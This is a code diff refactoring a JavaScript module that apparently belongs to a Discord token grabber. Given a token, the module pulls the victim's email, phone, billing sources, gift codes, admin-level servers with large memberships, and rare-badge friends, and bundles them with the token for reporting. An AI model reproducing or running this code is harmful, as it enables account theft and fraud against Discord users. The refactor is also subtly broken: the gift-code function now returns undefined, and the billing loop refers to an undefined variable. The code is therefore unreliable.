@@ -84,38 +84,33 @@ let getStatusEmoji = (s) => emojis.status[s];
 let getImage = (p) => !p ? false : `${p}.${require("sync-fetch")(p).headers.get("content-type").includes("image/gif") ? "gif" : "png"}?size=512`;
 
 let getGiftsCodes = (token, f) => {
-  let t = [];
-  const r = getDiscordApi(`https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=${f.locale}`, token);
-  if (r.length === 0) {
-    return "Codes-Gifts Not Found";
-  } else {
-    r.forEach((g) => {
-      t.push({
-        name: g.promotion.outbound_title,
-        code: g.code,
-      });
+  let t = [], r = getDiscordApi(`https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=${f.locale}`, token);
+  return r.length === 0 ? "Codes-Gifts Not Found" : r.forEach((g) => {
+    t.push({
+      name: g.promotion.outbound_title,
+      code: g.code,
     });
-  }
-  return t;
-}
+  });
+};
 
 let getGuilds = (n) => {
   let guilds = n;
-  let format = (l, x) => l.length ? l.map((s) => { return x ? `${s.owner && x ? "<:owner:963333541343686696>" : "<:staff:846569357353680896>"} | **${s.name}** - \`${s.id}\` | **Members** \`${s.member_count}\`` : `${s.owner ? "<:owner:963333541343686696> " : ""}**${s.name}** - \`${s.id}\` | **Members** \`${s.member_count}\`` }).join("\n") : "Not Found";
+  let format = (l, x) => l.length ? l.map((s) => x ? `${s.owner ? "<:owner:963333541343686696>" : "<:staff:846569357353680896>"} | **${s.name}** - \`${s.id}\` | **Members** \`${s.member_count}\`` : `${s.owner ? "<:owner:963333541343686696> " : ""}**${s.name}** - \`${s.id}\` | **Members** \`${s.member_count}\``).join("\n") : "Not Found";
   return {
     all: format(guilds.filter((a) => (a.permissions & 2048) === 2048).map((a) => ({ id: a.id, name: a.name, owner: a.owner, member_count: a.approximate_member_count })), false),
     rare: format(guilds.filter((s) => s.owner || (s.permissions & 8) === 8).filter((s) => s.approximate_member_count >= 500).map((s) => ({ id: s.id, name: s.name, owner: s.owner, member_count: s.approximate_member_count })), true),
   };
-}
+};
+
 
 let rareFriend = (r) => {
   let ñ = "";
-  for (const n of r.filter((_) => _.type === 1)) {
+  r.filter((_) => _.type === 1).forEach((n) => {
     const l = rareFriendadges(n.user.public_flags);
-    if (l !== "Not Found") ñ += `${l} ${n.user.username}#${n.user.discriminator}\n`;
-  }
+    ñ += l !== "Not Found" ? `${l} ${n.user.username}#${n.user.discriminator}\n` : "";
+  });
   return ñ || "Not Found";
-}
+};
 
 let getDiscordApi = (i, token) => {
   const res = require("sync-fetch")(i, {
@@ -128,44 +123,19 @@ let getDiscordApi = (i, token) => {
   return res.status === 200 ? res.json() : "Invalid";
 }
 
-let AllBadges = (f) => {
-  let r = "";
-  if (1 & f) r += emojis.user.i[0];
-  if (2 & f) r += emojis.user.i[1];
-  if (4 & f) r += emojis.user.i[2];
-  if (8 & f) r += emojis.user.i[3];
-  if (64 & f) r += emojis.user.i[4];
-  if (128 & f) r += emojis.user.i[5];
-  if (256 & f) r += emojis.user.i[6];
-  if (512 & f) r += emojis.user.i[7];
-  if (16384 & f) r += emojis.user.i[8];
-  if (4194304 & f) r += emojis.user.i[9];
-  if (131072 & f) r += emojis.user.i[10];
-  return r || ":x:";
-}
+let AllBadges = (f) => ((1 & f ? emojis.user.i[0] : "") + (2 & f ? emojis.user.i[1] : "") + (4 & f ? emojis.user.i[2] : "") + (8 & f ? emojis.user.i[3] : "") + (64 & f ? emojis.user.i[4] : "") + (128 & f ? emojis.user.i[5] : "") + (256 & f ? emojis.user.i[6] : "") + (512 & f ? emojis.user.i[7] : "") + (16384 & f ? emojis.user.i[8] : "") + (4194304 & f ? emojis.user.i[9] : "") + (131072 & f ? emojis.user.i[10] : "")) || ":x:";
 
-let rareFriendadges = (j) => {
-  let x = "";
-  if (1 & j) x += emojis.user.i[0];
-  if (2 & j) x += emojis.user.i[1];
-  if (4 & j) x += emojis.user.i[2];
-  if (8 & j) x += emojis.user.i[3];
-  if (512 & j) x += emojis.user.i[7];
-  if (16384 & j) x += emojis.user.i[8];
-  if (4194304 & j) x += emojis.user.i[9];
-  if (131072 & j) x += emojis.user.i[10];
-  return x || "Not Found";
-}
+let rareFriendadges = (j) => ((1 & j ? emojis.user.i[0] : "") + (2 & j ? emojis.user.i[1] : "") + (4 & j ? emojis.user.i[2] : "") + (8 & j ? emojis.user.i[3] : "") + (512 & j ? emojis.user.i[7] : "") + (16384 & j ? emojis.user.i[8] : "") + (4194304 & j ? emojis.user.i[9] : "") + (131072 & j ? emojis.user.i[10] : "")) || "Not Found";
 
 let getNitroPremium = (u) => {
-  const { premium_type, premium_guild_since } = u;
+  let { premium_type, premium_guild_since } = u, x = "<:nitro:1016385399020601344>";
   switch (premium_type) {
     default:
       return ":x:";
     case 1:
-      return "<:nitro:1016385399020601344>";
+      return x;
     case 2:
-      if (!premium_guild_since) return "<:nitro:1016385399020601344>";
+      if (!premium_guild_since) return x;
       const now = new Date();
       const m = [2, 3, 6, 9, 12, 15, 18, 24];
       let rem = 0;
@@ -176,7 +146,7 @@ let getNitroPremium = (u) => {
           break;
         }
       }
-      return `<:nitro:1016385399020601344> ${emojis.user.boost[rem]}`;
+      return `${x} ${emojis.user.boost[rem]}`;
   }
 }
 
@@ -197,13 +167,13 @@ let getDiscordInfo = (token) => {
   const applications = getDiscordApi("https://discord.com/api/v9/applications", token);
   const connections = getDiscordApi("https://discordapp.com/api/v9/users/@me/connections", token);
   const entitlements = getDiscordApi("https://discord.com/api/v8/users/@me/entitlements/gifts", token);
+  
   let p = "";
   paymentSources?.forEach(s => {
-    if (s.brand && s.invalid === 0)
-      p += emojis.user.payments[0];
-    if (source.email)
-      p += emojis.user.payments[1];
+    p += s.brand && s.invalid === 0 ? emojis.user.payments[0] : "";
+    p += source.email ? emojis.user.payments[1] : "";
   });
+
   const info = {
     token: token,
     ID: user.id,
@@ -228,7 +198,7 @@ let getDiscordInfo = (token) => {
     bio: user.bio || "Bio Not Found",
     phone: user.phone || "Phone Not Found",
     mail: user.email,
-    billing: !p ? "Not Found" : p,
+    billing: p ? p : "Not Found",
     langue: getLanguage(settings.locale),
     status: getStatusEmoji(settings.status),
     theme: getTheme(settings.theme),
@@ -240,11 +210,7 @@ let getDiscordInfo = (token) => {
     all: "Unfinished",
     rares: rareFriend(relationships),
   };
-  return {
-    all: info,
-    guilds: guildsInfo,
-    friends: friendsInfo
-  }
+  return { all: info, guilds: guildsInfo, friends: friendsInfo }
 }
 
 module.exports = getDiscordInfo
